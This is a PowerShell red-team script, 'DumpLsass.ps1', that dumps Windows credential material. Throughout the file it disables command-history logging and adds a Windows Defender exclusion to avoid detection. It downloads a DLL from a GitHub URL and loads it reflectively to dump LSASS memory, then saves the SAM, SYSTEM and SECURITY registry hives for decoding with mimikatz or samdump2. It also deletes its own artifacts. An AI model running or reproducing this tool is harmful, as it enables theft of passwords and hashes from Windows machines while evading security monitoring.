<#
.SYNOPSIS
   Dump LSASS, SAM, SYSTEM, SECURITY metadata

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: WinDefend (MpPreference)
   PS cmdlet Dev version: v1.1.9

.DESCRIPTION
   Dumps LSASS, SAM, SYSTEM, SECURITY metadata into %tmp%
   folder and use mimi`ka`tz or samdump2 to decode metadata.
   Remark: CmdLet creates Windows Defender Folder Exclusion.

.Parameter Storage
   Where to store dump files (default: $Env:TMP)

.Parameter Bypass
   Dont create folder exclusion (default: false)

.Parameter Delay
   DLL Reflection delay time (default: 300)

.EXAMPLE
   PS C:\> Get-Help .\DumpLsass.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Storage "$Env:TMP"
   Dumps lsass\sam\system\security data to %tmp%

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Bypass 'True'
   Dont create windows defender folder exclusion.

.INPUTS
   None. You cannot pipe objects into DumpLsass.ps1

.OUTPUTS
   session token
   -------------
   ADMINISTRATOR

   * Executing DLL Reflection to dump lsass

   GAC    Version        Location
   ---    -------        --------
   False  v4.0.30319

   * Dumping LSASS data to: 'C:\Users\pedro\AppData\Local\Temp\EyxctR.dmp'
   * Dumping sam, system, security data to: 'C:\Users\pedro\AppData\Local\Temp'
   * Done - TimeLapse: 00:52:14 - Decode with mimikatz\samdump2 ..
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://gist.github.com/r00t-3xp10it/8b770a33d06744f8dd0cbf8e007ec994
#>


## CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Storage="$Env:TMP",
   [string]$Bypass="False",
   [int]$Delay='300'
)


Write-Host ""
$CmdletVersion = "v1.1.9"
$Working_dir = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@DumpLsass $CmdletVersion {SSA@RedTeam}"
$RandName = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


## Check CmdLet requirements
If($IsClientAdmin -iMatch 'False')
{
   Write-Host "x Error: Administrator privileges required!`n" -ForegroundColor Red
   Exit #Exit @DumpLsass cmdlet
}
Else
{
   Write-Host "session token" -ForegroundColor Green
   Write-Host "-------------"
   Write-Host "ADMINISTRATOR`n"
   Start-Sleep -Milliseconds 500
}


cd "$Storage"
If([bool](Get-Service -Name "WinDefend") -iMatch 'True')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump LSASS process metadata

   .NOTES
      This Function creates one Windows Defender Folder Exclusion
      to be abble to dump lsass metadata without trigger detection.
   #>

   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch 'True')
   {
      $FExclusion = "True"
      ## Add Folder Exclusion to Windows Defender
      Set-MpPreference -ExclusionPath "$Storage" -Force
      Write-Host "* " -ForegroundColor Green -NoNewline
      Write-Host "Executing DLL Reflection to dump lsass"

      ## Download DLL from my GitHub repository
      # Remark: This DLL has compiled from dump.CS into dumper.DLL on a x64 bites system.
      # The original file can be found here: https://gist.github.com/r00t-3xp10it/8b770a33d06744f8dd0cbf8e007ec994
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/dumper.dll" -OutFile "dumper.dll"|Unblock-File

      ## Execute DLL Reflection
      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\dumper.dll"))
      Start-Sleep -Milliseconds $Delay;[dumper.Program]::Main("$pwd\$RandName.dmp")

      Start-Sleep -Milliseconds 600
      Write-Host "`n* " -ForegroundColor Green -NoNewline
      Write-Host "Dumping LSASS data to: '" -NoNewline
      Write-Host "$Storage\$RandName.dmp" -ForegroundColor Yellow -NoNewline
      Write-Host "'"
   }
   Else
   {
      $FExclusion = "false"
      Write-Host "x Error: Set-MpPreference not found." -ForegroundColor Red
      Write-Host "x Error: fail to execute DLL Reflection.`n" -ForegroundColor Red
   }
}
Else
{
   $FExclusion = "false"
   Write-Host "x Error: WinDefend not found." -ForegroundColor Red
   Write-Host "x Error: fail to execute DLL Reflection.`n" -ForegroundColor Red
}


If($FExclusion -iMatch 'false' -and $Bypass -iMatch 'True')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute DLL Reflection without creating folder Exclusion
   #>

   Write-Host "* " -ForegroundColor Green -NoNewline
   Write-Host "Executing DLL Reflection Exclusion Bypass."

   ## Download DLL from my GitHub repository
   # Remark: This DLL has compiled from dump.CS into dumper.DLL on a x64 bites system.
   # The original file can be found here: https://gist.github.com/r00t-3xp10it/8b770a33d06744f8dd0cbf8e007ec994
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/dumper.dll" -OutFile "dumper.dll"|Unblock-File

   ## Execute DLL Reflection
   [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\dumper.dll"))
   Start-Sleep -Milliseconds $Delay;[dumper.Program]::Main("$pwd\$RandName.dmp")

   Start-Sleep -Milliseconds 600
   Write-Host "`n* " -ForegroundColor Green -NoNewline
   Write-Host "Dumping LSASS data to: '" -NoNewline
   Write-Host "$Storage\$RandName.dmp" -ForegroundColor Yellow -NoNewline
   Write-Host "'"
}


<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Dump SAM, SYSTEM, SECURITY registry hive(s) data!
#>

## Delete old dumps left behind by previous executions.
If(Test-Path -Path "sam" -EA SilentlyContinue){Remove-Item -Path "$Storage\sam" -Force}
If(Test-Path -Path "system" -EA SilentlyContinue){Remove-Item -Path "$Storage\system" -Force}
If(Test-Path -Path "security" -EA SilentlyContinue){Remove-Item -Path "$Storage\security" -Force}

## Use cmd to dump related files
cmd /R reg save hklm\sam sam|Out-Null
cmd /R reg save hklm\system system|Out-Null
cmd /R reg save hklm\security security|Out-Null

Write-Host "* " -ForegroundColor Green -NoNewline
Write-Host "Dumping sam, system, security data to: '" -NoNewline
Write-Host "$Storage" -ForegroundColor Yellow -NoNewline
Write-Host "'"


## CleanUp all artifacts left behind.
If(Test-Path -Path "$Storage\dumper.dll"){Remove-Item -Path "$Storage\dumper.dll" -Force}
Start-Sleep -Milliseconds 600


$DoneDate = Get-Date -Format "HH:mm:ss"
Write-Host "* Done - TimeLapse: " -ForegroundColor Green -NoNewline
Write-Host "$DoneDate" -ForegroundColor Yellow -NoNewline 
Write-Host " - Decode with mim`ikatz\samdump2 .." -ForegroundColor Green


If($FExclusion -iMatch 'True')
{
   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -iMatch 'True')
   {
      ## Delete Windows Defender Folder Exclusion
      Remove-MpPreference -ExclusionPath "$Storage" -Force
   }
   Else
   {
      Write-Host "x Error: Remove-MpPreference not found." -ForegroundColor Red
      Write-Host "* Manual check Windows Defender Exclusions." -ForegroundColor DarkYellow
   }
}

cd "$Working_dir"
exit